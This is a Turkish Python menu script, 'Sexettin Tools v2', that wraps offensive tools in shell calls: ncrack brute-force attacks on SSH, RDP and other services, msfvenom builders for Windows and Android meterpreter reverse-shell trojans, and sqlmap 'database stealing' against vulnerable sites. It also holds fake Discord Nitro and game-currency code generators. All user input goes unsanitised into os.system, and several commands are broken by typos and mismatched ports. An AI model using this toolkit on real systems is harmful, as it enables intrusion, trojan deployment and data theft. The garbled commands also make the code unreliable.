#!/usr/bin/env python
import os
import py_compile
import random 

os.system("apt-install figlet")
os.system("apt-install chkrootkit")
os.system("clear")
os.system("figlet Sexettin Tools v2")

print('''

1-) Exploit Tarama Aracı

2-) Güvenlik Duvarı Tespit Aracı

3-) Kaba Kuvvet Saldırısı Aracı

4-) Port Tarama Aracı

5-) Rootkit Tarama Aracı

6-) Trojan Oluşturma Aracı

7-) Zaafiyet Analiz Aracı

8-) Zaafiyet Analiz Aracı v2

9-) Wordlist Oluşturma Aracı

10-) Hedef Ip Vpn Kontrol Aracı

11-) Mac Adresi Değiştirme Aracı

12-) Wordpress Tarama Aracı

13-) Derleme Aracı

14-) Veritabanı Çalma Aracı 

15-) Yeraltı

16-) Açıklama ve Nasıl Kullanılır? 

''')
sexettinsecim = input("Seçiminizi yazınız > ")

if(sexettinsecim=="1"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	anahtarkelime = input("Anahtar Kelime Girin: ")
	os.system("searchsloit " + anahtarkelime)

	istek = input("Yeni arama yapmak ister misiniz? (y/n): ")

	if(istek =="y"):
		os.system("python3 sexettin-toolsv1.py")
	elif(istek =="n"):
		print("Görüşürüüüz :') ")

	


elif(sexettinsecim=="2"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Güvenlik Duvarı Tespit Etme Aracına Hoş Geldin Kanka :D

	''')


	guvenliksite = input("Site Adresini Girin: ")
	os.system("wafw00f " + guvenliksite)


elif(sexettinsecim=="3"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''
Kaba Kuvvet Aracına Hoş Geldin :)

1-) FTP
2-) SSH
3-) TELNET
4-) HTTP
5-) SMB
6-) RDP
7-) SIP
8-) REDİS
9-) VNC
10-) PostgreSQL
11-) SQL

''')


	islemno = input("İşlem Numarasını Giriniz: ")
	hedefip = input("Hedef Ip Giriniz: ")
	kadi = input("Kullanıcı Adı Dosya Yolu: ")
	sifre = input("Şifrelerin Bulunduğu Dosya Yolu: ")

	if(islemno=="1"):
		os.system("nrack -p 21 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="2"):
		os.system("ncrack -p 22 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="3"):
		os.system("ncrack -p 23 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="4"):
		os.system("ncrack -p 24 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="5"):
		os.system("ncrack -p 25 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="6"):
		os.system("ncrack -p 26 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="7"):
		os.system("ncrack -p 27 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="8"):
		os.system("ncrack -p 28 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="9"):
		os.system("ncrack -p 29 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="10"):
		os.system("ncrack -p 30 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="11"):
		os.system("ncrack -p 31 -u " + kadi + " -P " + sifre + " " + hedefip)
	else:
		print("Hatalı seçim yaptın >:(")



elif(sexettinsecim=="4"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''



Port Tarama Aracına Hoşgeldin

1-) Hızlı Tarama

2-) Servis ve Versiyon Bilgisi

3-) İşletim Sistemi Bilgisi


''')



	islemno = input("İşlem Numarasını Girin: ")
	if(islemno=="1"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system=("nmap " +hedefip)

	elif(islemno=="2"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system("nmap -sS -sV " +hedefip)

	elif(islemno=="3"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system("nmap -0 " +hedefip)


	else:
		print("Hatalı seçim yaptın kanka")



elif(sexettinsecim=="5"):
	os.system("apt-get install chkrootkit")
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Rootkit Tarama Aracına Hoşgeldiniz!


''')
	os.system("chkrootkit")


elif(sexettinsecim=="6"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Trojan OLuşturma Aracına Hoş Geldin Kanka :D

	''')

	ip = input("Local veya Dış Ip giriniz: ")
	port = input("Port Girin: ")
	print('''
1-) windows/meterpreter/reverse_tcp
2-) windows/meterpreter/reverse_http
3-) windows/meterpreter/reverse_https
	''')
	payload = input("Payload No Giriniz: ")
	kayityeri = input("Kayıt Yerini Giriniz: ")

	if(payload=="1"):
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="2"):
		os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="3"):
		os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="4"):
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	elif(payload=="5"):
		os.system("msfvenom -p android/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	elif(payload=="6"):
		os.system("msfvenom -p android/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	else:
		print("Hatalı Seçim Yaptın Kanka ")
	
elif(sexettinsecim=="7"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")

	print('''

Zaafiyet Analizi Aracına Hoşgeldiniz


	''')

	hedefzaafiyetip = input("Hedef ip giriniz: ")
	os.system("nikto -h " +hedefzaafiyetip)

elif(sexettinsecim=="8"):
	os.system("apt-get install figlet")
	os.system("apt-get install lynis")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Hoşgeldiniz Zaafiyet analizi v2 aracı başlatılıyor...
	''')

	os.system("lynis audit system")

	print('''

ANALİZ SONUCU

	''')





elif(sexettinsecim=="9"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

En Kısa Yoldan Wordlist Oluşturma Toolu


''')
	minc = input("Minimum kaç haneli olsun? ")
	maxc = input("Maximum kaç haneli olsun? ")
	icindekikelime = input("İçinde hangi kelimeler/rakamlar bulunsun? ")
	dosyaadic = input("Dosyanın adı ne olsun? (uzantısı ile beraber yazınız) ")
	os.system("crunch "+minc+" "+maxc+" "+icindekikelime+" -o "+dosyaadic)

elif(sexettinsecim=="10"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Vpn Kontrol Aracına Hoşgeldiniz!

''')

	vpnhedefip = input("Hedef Ip Giriniz > ")
	os.system("ike-scan "+vpnhedefip)




elif(sexettinsecim=="11"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

MAC Adresi Değiştirme Aracına Hoşgeldiniz!

1-) Mac Adresini Random Belirle

2-) Mac Adresini Kendin Belirle

3-) Mac Adresini Orjinale Döndür

	''')

	macislem = input("İşlem Numarasını Yazınız > ")
	if(macislem=="1"):
		os.system("ifconfig eth0 down")
		os.system("macchanger -r eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mYeni mac adresi random belirlendi!]")


	elif(macislem=="2"):
		macadres = input("Yeni Mac Adresini Giriniz > ")
		os.system("ifconfig eth0 down")
		os.system("macchanger --mac "+macadres+" eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mYeni mac adresi elle belirlendi!]")


	elif(macislem=="3"):
		os.system("ifconfig eth0 down")
		os.system("macchanger -p eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mMac Adresi Orjinale Döndürüldü!]")
	else:
		print("Hatalı Seçim Yaptınız")
	


elif(sexettinsecim=="12"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

WORDPRESS Tarama Tool

1-) Hızlı Tarama

2-) Eklenti Tarama

3-) Tema Tarama 

4-) Yönetici Kullanıcı Adı Tarama

	''')

	wpislem = input("İşlem Numarası Giriniz > ")

	if(wpislem=="1"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp)
	elif(wpislem=="2"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate p")
	elif(wpislem=="3"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate t")
	elif(wpislem=="4"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate u")

	else:
		print("Hatalı Seçim Yaptınız")



elif(sexettinsecim=="13"):

	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Derleme Aracına Hoşgeldiniz!

	''')

	derle = input("Program Yolunu Giriniz > ")

	py_compile.compile(derle)




elif(sexettinsecim=="14"):

	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")

	print('''

1-) Açıklı Siteyi Biliyorum

2-) Açıklı Site Ve Veritabanı Adını Biliyorum

3-) Açıklı Siteyi Veritabanı Adını Ve Tablo Adını Biliyorum

örnek link: http://www.suesupriano/article.php?id=25

	''')

	sqlsecim = input("Seçim yapınız > ")
	if(sqlsecim=="1"):
		aciklilink = input("site gir")
		os.system("sqlmap -u "+aciklilink+" --dbs --random-agent")

	elif(sqlsecim=="2"):
		aciklilink = input("Açıklı siteyi girin > ")
		averitabani = input("veritabanı Adını Giriniz > ")
		os.system("sqlmap -u "+aciklilink+" -D "+averitabani+" --tables --random-agent")


	elif(sqlsecim=="3"):
		aciklilink = input("Açıklı siteyi girin > ")
		averitabani = input("veritabanı Adını Giriniz > ")
		tablo = input("Tablo Adını Giriniz > ")
		os.system("sqlmap -u "+aciklilink+" -D "+averitabani+" - T "+tablo+" --columns --random-agent")


	

	else:
		print("Hatalı Seçim Yaptın Kanka")



elif(sexettinsecim=="15"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettinin yeraltIsI")
	print('''

YERALTINA HOŞGELDİN DOST ;)


bunlar herhangi bişey çağırmıyor,kendi kodladığım generatorler her yerde çalışır

1-) Dic0rd nitro generator

2-) Şifre Oluşturucu

3-) G00gle pIay kod generator

4-) P3bg u¢ generator

5-) P3bg u¢ generatorv2 







	''')
	yeraltisecim = input("Sizi Nereye Alayım? ")
	if(yeraltisecim=="1"):



		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(16):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("discord.gift/"+password)
			
	elif(yeraltisecim=="2"):
		import random 


		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890.!+-"

		while 1:
			password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
			password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(0,password_uzunluk):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("Senin için oluşturduğum şifreler :" , password)


	elif(yeraltisecim=="3"):

		chars = "ABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(16):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print(password)


	elif(yeraltisecim=="4"):

		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(18):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print(password)



	
	elif(yeraltisecim=="5"):

		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(16):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("eKkVp-"+password)


	else:
		print("Hatalı seçim,doğru yaz kanka ")

elif(sexettinsecim=="16"):
	print('''
-------------------------------------------------------------
Bu toollar,tool kullanmaya yeni başlayan ve parametreleri kullanmayı yeni öğrenen insanların işini kolaylaştırmak için Sexettin tarafından kodlanmıştır (tool çağırıyor)
-------------------------------------------------------------
1.tool yani exploit tarama aracı,anahtar kelime girmenizi ister.Anahtar kelime girdikten sonra ise kendisi exploitleri searchsloit yardımı ile tarar	
##############################
2.Tool ise Güvenlik duvarı tespit etmeye yarar.Örneğin sexettin.weebly.com yazarak test edebilirsiniz wafw00f kullanarak tespit eder
##############################
3.tool kaba kuvvet saldırı aracıdır bu araç sizden bir seçim yapmanızı ister yaptığınız seçimler ile de protokol belirleyip sizden dosya ister verdiğiniz dosyalar ile kabakuvvet saldırısını gerçekleştirir ncrack kullanır
##############################
4.tool Port tarama aracıdır nmap kullanarak port tarama başlatır 3 farklı tarama seçeneği vardır
##############################
5.tool ise cihazınızdaki rootkitleri tarar bunun için root yetkisi ister rootkit taramak için chkrootkit kullanır rootkit ise bilgisayarın işletim sistemi çekirdeğine sızarak kötü niyetli kişilere bilgisayarınızı uzaktan kontrol etme yetkisi veren virüslerdir bu araç bunları tespit eder
##############################
6.tool ise trojan oluşturma aracıdır windows için trojan oluşturur sizden lhost lport ister ve metasploiti çağırarak işlemi tamamlar
##############################
7.tool zaafiyet analiz aracı nikto kullanır sizden hedef ip ister girdiğiniz ipye tarama yapar
##############################
8.tool lynis kullanarak zaafiyet analizi başlatır root yetkisi ister cihazınızı analiz eder
##############################
9.tool wordlist oluşturma aracıdır crunch kullanır.Minimum maximum rakam ve harf sayısını,içinde hangi rakam/harflerin bulunmasını istediğini sorar isim ve dosya uzantısı belirledikten sonra örnek pass.txt gibi,toolun bulunduğu dizine dosyayı oluşturur
##############################
10.tool elinizdeki ip'yi tarar ike-scan kullanır
##############################
11.tool mac adresi değiştirmek için kullanılır 3 çeşit seçeneği vardır macchanger kullanır
##############################
12.tool wpscan kullanarak wordpress taraması yapar sizden aldığı url ile 4 çeşit tarama gerçekleştirir
##############################
13.tool derleme aracıdır py_compile kütüphanesini kullanır,eğer dosyalarınızın içinin açılmasını istemiyorsanız kullanabilirsiniz derlenen dosya çalışır ama içi açılmaz kaynak kodlarına bakılmaz
##############################
14.tool veritabanı çalma aracıdır site ile ilgili bildiklerinizi seçtikten ve doldurduktan sonra işlemleri başlatır sqlmap kullanır  
''')


	


else:
	print("\033[91mHatalı seçim,doğru yaz kanka ")


